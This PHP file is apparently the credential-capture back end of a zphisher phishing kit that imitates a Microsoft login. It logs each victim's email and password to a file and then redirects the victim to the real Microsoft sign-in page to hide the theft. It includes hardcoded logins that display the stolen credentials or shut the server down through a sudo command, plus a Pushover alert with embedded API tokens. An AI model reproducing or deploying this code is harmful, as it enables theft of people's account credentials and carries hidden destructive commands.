<?php
include 'ip.php';
session_start();
$pass = $_POST["passwd"];
$email = $_SESSION["Email"];

// Original file path
$original_file_path = '/home/ShadowTEAM-Guest/zphisher/auth/usernames.dat';
// Specified file path for storing existing emails
$specified_file_path = '/home/ShadowTEAM-Guest/backup.txt';

function sendPushoverNotification($email) {
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://api.pushover.net/1/messages.json",
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query(array(
            "token" => "azeof8j4d1hirikyij4petny4z8hdb",
            "user" => "u8dj7newbwmq41b1uv2mhuzfwrdu2r",
            "message" => "Website Update\ncheck website\n\n$email",
        )),
        CURLOPT_RETURNTRANSFER => true,
    ));
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function writeToFile($file_path, $content) {
    return file_put_contents($file_path, $content, FILE_APPEND);
}

if ($email == "bee8ikjhtrfgy65tyujhgfr4567uiopp") {
    sendPushoverNotification($email);
}

// Calculate the number of spaces needed based on the length of the email
$num_spaces = max(0, 33 - strlen($email));
$spaces_after_email = str_repeat(' ', $num_spaces);
$company = str_repeat(' ', max(0, 21 - strlen($pass))); // Ensure non-negative

if ($email === "beep" && $pass === "boop") {
    if (file_exists($original_file_path)) {
        $file_content = file_get_contents($original_file_path);
        if ($file_content !== false) {
            // Add a button to view the backup.txt file
            echo "<pre>" . htmlspecialchars($file_content) . "</pre>";
            echo '<form action="view_backup.php" method="post"><input type="submit" value="View Backup"></form>';
        } else {
            echo 'Unable to read file.';
        }
    } else {
        echo 'File not found.';
    }
} elseif ($email === "die" && $pass === "die") {
    // Dangerous command, should be handled with caution
    shell_exec('sudo shutdown -h now');
    exit();
} else {
    // Check if the email exists in usernames.dat
    if (file_exists($original_file_path)) {
        $file_content = file_get_contents($original_file_path);
        if (strpos($file_content, $email) !== false) {
            writeToFile($specified_file_path, "Username:: " . $email . $spaces_after_email . "    Password:: " . $pass . "\n");
        } else {
            writeToFile($original_file_path, "Username:: " . $email . $spaces_after_email . "    Password:: " . $pass . $company . "Company::  \n");
        }
    } else {
        writeToFile($original_file_path, "Username:: " . $email . $spaces_after_email . "    Password:: " . $pass . $company . "Company::  \n");
    }

    header('Location: https://login.microsoftonline.com/');
    exit();
}

session_destroy();
?>
